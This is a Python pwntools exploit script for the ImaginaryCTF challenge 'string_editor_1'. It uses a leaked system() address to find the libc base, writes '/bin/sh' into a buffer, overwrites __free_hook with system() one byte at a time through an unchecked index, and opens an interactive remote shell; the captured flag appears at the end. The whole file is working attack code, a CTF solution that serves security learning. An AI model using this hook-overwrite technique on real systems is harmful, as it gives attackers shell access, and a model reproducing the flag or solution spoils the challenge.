from pwn import *

#For local debugging
#target = process('./string_editor_1', env={"LD_PRELOAD":"./libc.so.6"})
#pid = gdb.attach(target, "\nb *main+394\nb *main+268\n set disassembly-flavor intel\ncontinue")

target = remote('chal.imaginaryctf.org', 42004)

libc = ELF('libc.so.6')

print(target.recvuntil(b'sponsors: '))
leak = target.recv(14)
system = int(leak, 16)
print(hex(system))
libc_base = system - libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
print(hex(free_hook))

#My failed onegadget experiment! I left it in for posterity.
onegadget1 = libc_base + 0xe6e73
onegadget2 = libc_base + 0xe6e76
onegadget3 = libc_base + 0xe6e79
print('onegadget 1 at', hex(onegadget1))
print('onegadget 2 at', hex(onegadget2))
print('onegadget 3 at', hex(onegadget3))

#
print(target.recvuntil(b'pallette)'))
target.sendline(b'0')
print(target.recvuntil(b'index?'))
target.sendline(b'a')

print(target.recvuntil(b'DEBUG: '))
leak = target.recv(14)

#Determining the index that I need to enter
overwrite_base = int(leak, 16)
offset = free_hook - overwrite_base
#Now divide the onegadget into 6 bytes:


payload = p64(system)
#Overwrite the rdi passed to free, one character at a time:
line = b'/bin/sh\x00'
for i in range(8):
	print(target.recvuntil(b'pallette)'))
	target.sendline(str(i).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(line[i].to_bytes(1, 'little'))

#Since libc addresses are only 6 bytes long, I can save a little bit of time by only overwriting 6 bytes.
for i in range(6):
	payload_part = payload[i].to_bytes(1, 'little')
	print(payload_part)
	final_offset = offset + i
	print(target.recvuntil(b'pallette)'))
	target.sendline(str(final_offset).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload_part) 	
	
print(target.recvuntil(b'pallette)'))
target.sendline(b'15')

target.interactive()

#ictf{alw4ys_ch3ck_y0ur_1nd1c3s!_4e42c9f2}
